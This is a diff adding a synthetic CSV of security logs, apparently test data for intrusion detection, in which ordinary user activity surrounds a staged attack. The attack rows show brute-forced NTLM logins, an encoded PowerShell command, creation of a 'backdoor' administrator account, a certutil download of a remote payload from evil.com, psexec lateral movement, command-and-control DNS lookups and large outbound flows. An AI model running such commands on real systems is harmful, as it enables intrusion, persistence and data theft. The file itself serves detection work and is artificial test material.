@@ -1,0 +1,40 @@
+event_type,timestamp,user,source_host,destination_host,process,action,details
+auth,1700000,john,LAPTOP01,DC01,,LogonSuccess,Kerberos|TGT
+auth,1700010,sarah,LAPTOP02,DC01,,LogonSuccess,Kerberos|TGT
+auth,1700020,mike,LAPTOP03,FILE_SVR,,LogonSuccess,Kerberos|TGT
+auth,1700050,john,LAPTOP01,MAIL_SVR,,LogonSuccess,Kerberos|TGT
+auth,1700100,sarah,LAPTOP02,FILE_SVR,,LogonSuccess,Kerberos|TGT
+process,1700200,john,LAPTOP01,,outlook.exe,Execute,Normal email client
+process,1700300,sarah,LAPTOP02,,chrome.exe,Execute,Normal browsing
+process,1700400,mike,LAPTOP03,,excel.exe,Execute,Normal spreadsheet
+dns,1700500,,LAPTOP01,mail.company.com,,,DNS_QUERY
+dns,1700600,,LAPTOP02,drive.company.com,,,DNS_QUERY
+flow,1700700,,LAPTOP01,MAIL_SVR,,,bytes=2000|duration=5|protocol=tcp
+flow,1700800,,LAPTOP02,FILE_SVR,,,bytes=4000|duration=10|protocol=tcp
+auth,1701000,attacker_x,UNKNOWN_PC,DC01,,LogonFailure,NTLM|Network|Failure
+auth,1701002,attacker_x,UNKNOWN_PC,DC01,,LogonFailure,NTLM|Network|Failure
+auth,1701004,attacker_x,UNKNOWN_PC,DC01,,LogonFailure,NTLM|Network|Failure
+auth,1701006,attacker_x,UNKNOWN_PC,DC01,,LogonFailure,NTLM|Network|Failure
+auth,1701008,attacker_x,UNKNOWN_PC,DC01,,LogonSuccess,NTLM|Network
+auth,1701010,attacker_x,UNKNOWN_PC,FILE_SVR,,LogonSuccess,NTLM|Network
+auth,1701012,attacker_x,UNKNOWN_PC,DB_SVR,,LogonSuccess,NTLM|Network
+auth,1701014,attacker_x,UNKNOWN_PC,HR_SVR,,LogonSuccess,NTLM|Network
+auth,1701016,attacker_x,UNKNOWN_PC,BACKUP_SVR,,LogonSuccess,NTLM|Network
+auth,1701018,attacker_x,UNKNOWN_PC,FINANCE_SVR,,LogonSuccess,NTLM|Network
+process,1701020,attacker_x,FILE_SVR,,powershell.exe,Execute,CommandLine=-enc SQBFAHgAIAAoA
+process,1701025,attacker_x,FILE_SVR,,whoami.exe,Execute,CommandLine=/priv
+process,1701030,attacker_x,DB_SVR,,cmd.exe,Execute,CommandLine=net user backdoor Pass /add
+process,1701035,attacker_x,DB_SVR,,net.exe,Execute,CommandLine=localgroup administrators backdoor /add
+process,1701040,attacker_x,HR_SVR,,certutil.exe,Execute,CommandLine=-urlcache -f http://evil.com/rat.exe
+process,1701045,attacker_x,BACKUP_SVR,,psexec.exe,Execute,CommandLine=FINANCE_SVR cmd.exe
+dns,1701050,,FILE_SVR,xk3jf92m.malware.cc,,,DNS_QUERY
+dns,1701052,,DB_SVR,p7hq2k49.malware.cc,,,DNS_QUERY
+dns,1701054,,HR_SVR,cmd-control.evil.com,,,DNS_QUERY
+dns,1701056,,BACKUP_SVR,r8m3x2v1.malware.cc,,,DNS_QUERY
+flow,1701060,,FILE_SVR,203.0.113.50,,,bytes=8000000|duration=180|protocol=tcp
+flow,1701065,,DB_SVR,203.0.113.50,,,bytes=15000000|duration=300|protocol=tcp
+flow,1701070,,HR_SVR,203.0.113.50,,,bytes=5000000|duration=120|protocol=tcp
+auth,1702000,john,LAPTOP01,DC01,,LogonSuccess,Kerberos|TGT
+auth,1702100,sarah,LAPTOP02,FILE_SVR,,LogonSuccess,Kerberos|TGT
+process,1702200,john,LAPTOP01,,teams.exe,Execute,Normal meeting
+flow,1702300,,LAPTOP01,MAIL_SVR,,,bytes=1500|duration=3|protocol=tcp
